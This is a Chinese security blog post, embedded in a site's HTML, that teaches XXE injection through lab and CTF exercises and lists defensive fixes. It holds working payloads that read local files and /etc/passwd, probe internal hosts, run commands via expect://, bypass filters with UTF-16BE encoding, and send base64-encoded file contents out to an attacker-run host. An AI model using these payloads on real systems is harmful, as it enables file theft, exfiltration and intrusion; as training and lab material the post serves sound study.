@@ -1,0 +1,469 @@
+<!DOCTYPE html><html lang="zh-CN "><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hongxiaodou || 39web漏洞-xxe&amp;xml检测利用绕过全解</title>
+    <meta name="author" content="hongxiaodou">
+    <meta name="description" content="林深不见鹿，山巅自相逢 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/images/1.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<!-- hexo injector head_end start --><style>
+.body hanla:after {
+    content: ' ';
+    display: inline;
+    font-family: Arial;
+    font-size: 0.89em;
+}
+
+html code hanla,
+html pre hanla,
+html kbd hanla,
+html samp hanla {
+    display: none;
+}
+
+html ol > hanla,
+html ul > hanla {
+    display: none;
+}
+</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+
+    <div id="loading" style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent" style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p><hanla></hanla>加载过慢请开启缓存<hanla></hanla>(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hongxiaodou</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>主页</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>Hongxiaodou</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled">
+                    </a-icon></div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;"><hanla></hanla>主页</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1><hanla></hanla>39web<hanla></hanla>漏洞-xxe&amp;xml<hanla></hanla>检测利用绕过全解 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled">
+            </a-icon></span>
+            2021/8/11
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/xxe&amp;xml漏洞">
+                <span class="icon">
+                    <a-icon type="book" theme="filled">
+                </a-icon></span><hanla></hanla>
+                xxe&amp;xml<hanla></hanla>漏洞
+            </a>
+        </span>
+        
+
+        
+    </div>
+
+    <div class="content" v-pre="">
+        <p>参考文章：</p>
+<span id="more"></span>
+
+
+<p><a target="_blank" rel="noopener" href="https://blog.zsec.uk/blind-xxe-learning/">https://blog.zsec.uk/blind-xxe-learning/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86075">https://www.anquanke.com/post/id/86075</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.hackersb.cn/hacker/211.html">http://www.hackersb.cn/hacker/211.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://uknowsec.cn/posts/notes/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html">https://uknowsec.cn/posts/notes/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</a></p>
+<p><img src="https://i.loli.net/2021/08/11/IJ7qSlNQwAz9iO3.png" alt="39_1.png"></p>
+<p>XML 被设计为传输和存储数据，XML 文档结构包括 XML 声明、</p>
+<p>DTD 文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据</p>
+<p>从 HTML 分离，是独立于软件和硬件的信息传输工具。XXE 漏洞全称</p>
+<p>XML External Entity Injection，即 xml 外部实体注入漏洞，XXE 漏洞发</p>
+<p>生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载</p>
+<p>恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站</p>
+<p>等危害</p>
+<p>XML 与 HTML 的主要差异</p>
+<p>XML 被设计为传输和存储数据，其焦点是数据的内容。</p>
+<p>HTML 被设计用来显示数据，其焦点是数据的外观。</p>
+<p>HTML 旨在显示信息 ，而 XML 旨在传输信息。</p>
+<p><img src="https://pic.imgdb.cn/item/6113e28a5132923bf84c2dd9.png" alt="q1.png"></p>
+<h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><p><hanla></hanla>文档类型定义（DTD）可定义合法的 XML 文档构建模块</p>
+<p>它使用一系列合法的元素来定义文档的结构</p>
+<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用</p>
+<p>(1）内部的 DOCTYPE 声明</p>
+<pre><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;
+</code></pre>
+<p>（2）外部文档声明</p>
+<pre><code><hanla></hanla>    文件名”&gt;
+</code></pre>
+<h1 id="DTD-实体"><a href="#DTD-实体" class="headerlink" title="DTD 实体"></a>DTD 实体</h1><p>（1）内部实体声明</p>
+<pre><code><hanla></hanla><!-- ENTITY 实体名称 ”<hanla-->实体的值”&gt;
+</code></pre>
+<p>(2）外部实体声明</p>
+<pre><code>&lt;! ENTITY 实体名称 SYSTEM ”URI”&gt;
+</code></pre>
+<p>(3）参数实体声明</p>
+<pre><code><hanla></hanla><!-- ENTITY %<hanla-->实体名称 ”<hanla></hanla>实体的值”&gt;
+
+<!-- ENTITY %<hanla-->实体名称 SYSTEM ”URI”&gt;
+</code></pre>
+<h1 id="xxe-漏洞修复与防御方案-php-java-python-过滤及禁用"><a href="#xxe-漏洞修复与防御方案-php-java-python-过滤及禁用" class="headerlink" title="xxe 漏洞修复与防御方案-php,java,python-过滤及禁用"></a>xxe 漏洞修复与防御方案-php,java,python-过滤及禁用</h1><h2 id="方案-1-禁用外部实体"><a href="#方案-1-禁用外部实体" class="headerlink" title="方案 1-禁用外部实体"></a>方案 1-禁用外部实体</h2><p><hanla></hanla>PHP:</p>
+<p>libxm_disable_entity_loader(true);</p>
+<p>JAVA:</p>
+<p>DocumentBuilderFactory<br>dbf</p>
+<p>=DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</p>
+<p>Python：</p>
+<p>from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(<br>resolve_entities=False))</p>
+<h2 id="方案-2-过滤用户提交的-XML-数据"><a href="#方案-2-过滤用户提交的-XML-数据" class="headerlink" title="方案 2-过滤用户提交的 XML 数据"></a>方案 2-过滤用户提交的 XML 数据</h2><p>过滤关键词：  </p>
+<p><img src="https://pic.imgdb.cn/item/6113e28a5132923bf84c2de9.png" alt="q2.png"></p>
+<h1 id="pikachu-靶场-xml-数据传输测试-回显-玩法-协议-引入"><a href="#pikachu-靶场-xml-数据传输测试-回显-玩法-协议-引入" class="headerlink" title="pikachu 靶场 xml 数据传输测试-回显,玩法,协议,引入"></a><hanla></hanla>pikachu 靶场 xml 数据传输测试-回显,<hanla></hanla>玩法,<hanla></hanla>协议,<hanla></hanla>引入</h1><p><img src="https://i.loli.net/2021/08/11/n2dlGfRNh1poK4B.png" alt="39_2.png"></p>
+<h3 id="玩法-读文件"><a href="#玩法-读文件" class="headerlink" title="玩法-读文件"></a>玩法-读文件</h3><pre><code><hanla></hanla>&lt;?xml version = "1.0"?&gt;
+
+&lt;!DOCTYPE ANY [
+
+&lt;!ENTITY xxe SYSTEM "file:///d://test.txt"&gt;
+
+]&gt;
+
+&lt;x&gt;&amp;xxe;&lt;/x&gt;
+</code></pre>
+<p><hanla></hanla>在本地<hanla></hanla>d:/test.txt 存在便可以读取里面的内容</p>
+<p><img src="https://i.loli.net/2021/08/11/Rr5ODSKuwenUiWo.png" alt="39_3.png"></p>
+<h3 id="玩法-内网探针或攻击内网应用（触发漏洞地址）"><a href="#玩法-内网探针或攻击内网应用（触发漏洞地址）" class="headerlink" title="玩法-内网探针或攻击内网应用（触发漏洞地址）"></a>玩法-内网探针或攻击内网应用（触发漏洞地址）</h3><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+
+&lt;!DOCTYPE foo [
+
+&lt;!ELEMENT foo ANY &gt;
+
+&lt;!ENTITY rabbit SYSTEM "http://192.168.0.103:8081/index.txt" &gt;
+
+]&gt;
+
+&lt;x&gt;&amp;rabbit;&lt;/x&gt;
+</code></pre>
+<p><img src="https://i.loli.net/2021/08/11/i2vYPNdtFg6CMZE.png" alt="39_4.png"></p>
+<p>我的：192.168.43.39:80/flag.php</p>
+<h3 id="玩法-RCE"><a href="#玩法-RCE" class="headerlink" title="玩法-RCE"></a>玩法-RCE</h3><p><hanla></hanla>该 CASE 是在安装 expect 扩展的 PHP 环境里执行系统命令</p>
+<pre><code>&lt;?xml version = "1.0"?&gt;
+
+&lt;!DOCTYPE ANY [
+
+&lt;!ENTITY xxe SYSTEM "expect://id" &gt;
+
+]&gt;
+
+&lt;x&gt;&amp;xxe;&lt;/x&gt;
+</code></pre>
+<h3 id="引入外部实体-dtd"><a href="#引入外部实体-dtd" class="headerlink" title="引入外部实体 dtd"></a>引入外部实体 dtd</h3><pre><code>&lt;?xml version="1.0" ?&gt;
+
+&lt;!DOCTYPE test [
+
+&lt;!ENTITY % file SYSTEM "http://127.0.0.1:8081/evil2.dtd"&gt;
+
+%file;
+
+]&gt;
+
+&lt;x&gt;&amp;send;&lt;/x&gt;
+
+evil2.dtd:
+
+&lt;!ENTITY send SYSTEM "file:///d:/test.txt"&gt;
+</code></pre>
+<h3 id="无回显-读取文件"><a href="#无回显-读取文件" class="headerlink" title="无回显-读取文件"></a>无回显-读取文件</h3><pre><code><hanla></hanla>&lt;?xml version="1.0"?&gt;
+
+&lt;!DOCTYPE test [
+
+&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=d:/test.txt"&gt;
+
+&lt;!ENTITY % dtd SYSTEM "http://192.168.0.103:8081/test.dtd"&gt;
+
+%dtd;
+
+%send;
+
+]&gt;
+
+test.dtd：
+
+&lt;!ENTITY % payload
+
+"&lt;!ENTITY &amp;#x25;send SYSTEM 'http://192.168.0.103:8081/?data=%file;'&gt;"
+
+&gt;
+
+%payload;
+</code></pre>
+<p>首先把网页的回显给注释掉：</p>
+<p><img src="https://i.loli.net/2021/08/11/cQxhuK5mU4i9zaX.png" alt="39_5.png"></p>
+<p>开启网站日志记录，在配置文件中改</p>
+<p><hanla></hanla>test.dtd<hanla></hanla>内容：</p>
+<p><img src="https://i.loli.net/2021/08/11/P6oeG21XwFrZSEl.png" alt="39_6.png"></p>
+<p>payload:</p>
+<pre><code>&lt;?xml version="1.0"?&gt;
+
+&lt;!DOCTYPE test [
+
+&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=d:/test.txt"&gt;
+
+&lt;!ENTITY % dtd SYSTEM "http://192.168.43.39:80/test.dtd"&gt;
+
+%dtd;
+
+%send;
+
+]&gt;
+</code></pre>
+<p>这个过程，<br><hanla></hanla>1，服务器执行<hanla></hanla>xml<hanla></hanla>的恶意语句，读取<hanla></hanla>test.txt<hanla></hanla>内容用<hanla></hanla>base64<hanla></hanla>方式加密保存在<br><hanla></hanla>%file 变量中<br><hanla></hanla>2，服务器访问<a target="_blank" rel="noopener" href="http://192.168.43.39/test.dtd"><hanla></hanla>http://192.168.43.39:80/test.dtd</a><hanla></hanla> 这个<hanla></hanla>dtd<hanla></hanla>文件内容（引入外部实体）<br>3，读取里面内容又会访问<a target="_blank" rel="noopener" href="http://192.168.43.39/?data=%25file"><hanla></hanla>http://192.168.43.39:80/?data=%file</a><hanla></hanla> 并将变量<hanla></hanla>%file 的<br><hanla></hanla>内容传递个<hanla></hanla>data<hanla></hanla>参数，攻击者在查看自己日志就可以了，</p>
+<p>返回内容：</p>
+<p><img src="https://i.loli.net/2021/08/11/uFIxVL6jv5q3DhM.png" alt="39_7.png"></p>
+<p><img src="https://i.loli.net/2021/08/11/7LzcQJhNlIA8isv.png" alt="39_8.png"></p>
+<h1 id="协议-读文件（绕过）"><a href="#协议-读文件（绕过）" class="headerlink" title="协议-读文件（绕过）"></a>协议-读文件（绕过）</h1><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p>
+<p><hanla></hanla>针对<hanla></hanla>ENTITY “ SYSTEM “ FILE<hanla></hanla>等关键字<br>使用编码方式绕过：UTF-16BE</p>
+<p><code>cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml</code></p>
+<p>绕过</p>
+<pre><code>&lt;?xml version = "1.0"?&gt;
+
+&lt;!DOCTYPE ANY [ &lt;!ENTITY f SYSTEM "php://filter/read=convert.base64-encode/resource=xxe.php"&gt; ]&gt;
+
+&lt;x&gt;&amp;f;&lt;/x&gt;
+</code></pre>
+<p>正常如果是黑盒测试时，确定他存在漏洞但是，有过滤，我们可以用网上的一些字典</p>
+<p><hanla></hanla>fuzz<hanla></hanla>批量去跑，看有没有能够通过的，来判断他是什么过滤</p>
+<h1 id="xxe-lab-靶场登陆框-xml-数据传输测试-检测发现"><a href="#xxe-lab-靶场登陆框-xml-数据传输测试-检测发现" class="headerlink" title="xxe-lab 靶场登陆框 xml 数据传输测试-检测发现"></a>xxe-lab 靶场登陆框 xml 数据传输测试-检测发现</h1><p><a target="_blank" rel="noopener" href="https://github.com/c0ny1/xxe-lab"><hanla></hanla>https://github.com/c0ny1/xxe-lab</a></p>
+<p><hanla></hanla>1.<hanla></hanla>提交的数据包含 XML 格式如：</p>
+<p><code>&lt;forgot&gt;&lt;username&gt;admin&lt;/username&gt;&lt;/forgot&gt;</code></p>
+<p><hanla></hanla>2.<hanla></hanla>请求头中如：</p>
+<pre><code>Content-Type：text/xml 或 Content-type:application/xml
+
+&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE Mikasa [
+
+&lt;!ENTITY test SYSTEM "file:///d:/test.txt"&gt;
+
+]&gt;
+
+&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;Mikasa&lt;/password&gt;&lt;/user&gt;
+</code></pre>
+<p><img src="https://i.loli.net/2021/08/11/XtlaAi8uD6ms7dQ.png" alt="39_9.png"></p>
+<p><img src="https://i.loli.net/2021/08/11/UW3fiblLnSoDrtg.png" alt="39_10.png"></p>
+<p><hanla></hanla>3.<hanla></hanla>更改<hanla></hanla>content-type<hanla></hanla>值看返回 （ CTF-Jarvis-OJ-Web-XXE 安全真题复现-数据请求格式）</p>
+<p><a target="_blank" rel="noopener" href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a></p>
+<pre><code>&lt;?xml version = "1.0"?&gt;
+
+&lt;!DOCTYPE ANY [
+
+&lt;!ENTITY f SYSTEM "file:///etc/passwd"&gt;
+
+]&gt;
+
+&lt;x&gt;&amp;f;&lt;/x&gt;
+</code></pre>
+<p>抓包发现：更改读到</p>
+<p><img src="https://pic.imgdb.cn/item/6113d7ba5132923bf82a36ca.png" alt="39_11.png">   </p>
+<p><img src="https://pic.imgdb.cn/item/6113d7ba5132923bf82a36d7.png" alt="39_12.png">    </p>
+<h1 id="CTF-Vulnhub-XXE-安全真题复现-检测-利用-拓展-实战"><a href="#CTF-Vulnhub-XXE-安全真题复现-检测-利用-拓展-实战" class="headerlink" title="CTF-Vulnhub-XXE 安全真题复现-检测,利用,拓展,实战"></a><hanla></hanla>CTF-Vulnhub-XXE 安全真题复现-检测,<hanla></hanla>利用,<hanla></hanla>拓展,<hanla></hanla>实战</h1><p><hanla></hanla>打开靶场发现没有<hanla></hanla>ip<hanla></hanla>地址</p>
+<p><img src="https://pic.imgdb.cn/item/6113d7ba5132923bf82a36e4.png" alt="39_13.png"></p>
+<p><hanla></hanla>用<hanla></hanla>namp<hanla></hanla>命令：namp -sS 192.168.233.1/24</p>
+<p><img src="https://pic.imgdb.cn/item/6113d7ba5132923bf82a3705.png" alt="39_14.png"></p>
+<p><hanla></hanla>所以这个<hanla></hanla>129<hanla></hanla>是我们要攻击的地址：</p>
+<p><img src="https://pic.imgdb.cn/item/6113d7ba5132923bf82a371f.png" alt="39_15.png"></p>
+<p><hanla></hanla>他开放了<hanla></hanla>80<hanla></hanla>端口我们可以浏览器访问一下：</p>
+<p><img src="https://pic.imgdb.cn/item/6113d97a5132923bf82fbf2b.png" alt="39_16.png"></p>
+<p><img src="https://pic.imgdb.cn/item/6113d97a5132923bf82fbf3b.png" alt="39_17.png"></p>
+<p><hanla></hanla>扫一下能扫到一个<hanla></hanla>robots.txt<hanla></hanla>的文件，访问下面有<hanla></hanla>xxe<hanla></hanla>和<hanla></hanla>admin.php<hanla></hanla>两个文件</p>
+<p><img src="https://pic.imgdb.cn/item/6113d97a5132923bf82fbf47.png" alt="39_18.png"></p>
+<p><img src="https://pic.imgdb.cn/item/6113d97a5132923bf82fbf58.png" alt="39_19.png"></p>
+<p><hanla></hanla>192.168.223.129:80/admin.php<hanla></hanla>访问<hanla></hanla>admin.php<hanla></hanla>禁止访问</p>
+<p><img src="https://pic.imgdb.cn/item/6113d97a5132923bf82fbf68.png" alt="39_20.png"></p>
+<p><hanla></hanla>在<hanla></hanla>xxe<hanla></hanla>下面找到一个登录框<br><hanla></hanla>抓包很显然这是一个<hanla></hanla>xml<hanla></hanla>传输的包：</p>
+<p><img src="https://pic.imgdb.cn/item/6113da185132923bf831bcda.png" alt="39_21.png"></p>
+<p><hanla></hanla>使用<hanla></hanla>xml<hanla></hanla>语句：</p>
+<pre><code>&lt;?xml version="1.0" ?&gt;
+
+&lt;!DOCTYPE r [
+
+&lt;!ELEMENT r ANY &gt;
+
+&lt;!ENTITY sp SYSTEM "php://filter/read=convert.base64-encode/resource=admin.php"&gt;
+
+]&gt;
+
+&lt;root&gt;&lt;name&gt;&amp;sp;&lt;/name&gt;&lt;password&gt;hj&lt;/password&gt;&lt;/root&gt;
+</code></pre>
+<p><img src="https://pic.imgdb.cn/item/6113da185132923bf831bce6.png" alt="39_22.png"></p>
+<p><hanla></hanla>读取<hanla></hanla>xxe.php<hanla></hanla>这个文件，发送到这个目录进行解密</p>
+<p><img src="https://pic.imgdb.cn/item/6113da185132923bf831bcf4.png" alt="39_23.png"></p>
+<p><hanla></hanla>然后读<hanla></hanla>admin.php<hanla></hanla>进行解密：</p>
+<p><img src="https://pic.imgdb.cn/item/6113da195132923bf831bd05.png" alt="39_24.png"></p>
+<p>把密码进行解密：</p>
+<p><img src="https://pic.imgdb.cn/item/6113da195132923bf831bd15.png" alt="39_25.png">  </p>
+<p>![39_26.png]<a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/6113dc375132923bf838aaea.png">https://pic.imgdb.cn/item/6113dc375132923bf838aaea.png</a>)  </p>
+<p>输入账号密码进行登录</p>
+<p><img src="https://pic.imgdb.cn/item/6113dc375132923bf838aaff.png" alt="39_27.png"></p>
+<p><img src="https://pic.imgdb.cn/item/6113dc375132923bf838ab0f.png" alt="39_28.png"></p>
+<p><hanla></hanla>进来什么都没有再用<hanla></hanla>xml<hanla></hanla>漏洞去读一下</p>
+<p><img src="https://pic.imgdb.cn/item/6113dc375132923bf838ab24.png" alt="39_29.png"></p>
+<p><hanla></hanla>只有<hanla></hanla>32<hanla></hanla>位是<hanla></hanla>base32<hanla></hanla>位加密</p>
+<p><img src="https://pic.imgdb.cn/item/6113dc375132923bf838ab36.png" alt="39_30.png"></p>
+<p><hanla></hanla>然后在<hanla></hanla>base64<hanla></hanla>解密：</p>
+<p><img src="https://pic.imgdb.cn/item/6113dd455132923bf83c2076.png" alt="39_31.png"></p>
+<p><img src="https://pic.imgdb.cn/item/6113dd455132923bf83c208e.png" alt="39_32.png"></p>
+<p>在读取这个完整路径</p>
+<p><img src="https://pic.imgdb.cn/item/6113dd465132923bf83c209b.png" alt="39_33.png"></p>
+<p>路径解码后<br><hanla></hanla>用<hanla></hanla>php<hanla></hanla>在线运行环境运行  </p>
+<p><img src="https://pic.imgdb.cn/item/6113dd465132923bf83c20b9.png" alt="39_34"></p>
+<h1 id="xxe-安全漏洞自动化注射脚本工具-XXEinjector-Ruby"><a href="#xxe-安全漏洞自动化注射脚本工具-XXEinjector-Ruby" class="headerlink" title="xxe 安全漏洞自动化注射脚本工具-XXEinjector(Ruby)"></a>xxe 安全漏洞自动化注射脚本工具-XXEinjector(Ruby)</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9614990.html">https://www.cnblogs.com/bmjoker/p/9614990.html</a></p>
+<p>xxe_payload_fuzz</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/enjoiz/XXEinjector">https://github.com/enjoiz/XXEinjector</a></p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2021 Hongxiaodou
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled"></a-icon></span>
+            @hongxiaodou
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> &amp; <a target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'zh-CN',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+
+
+</body></html>
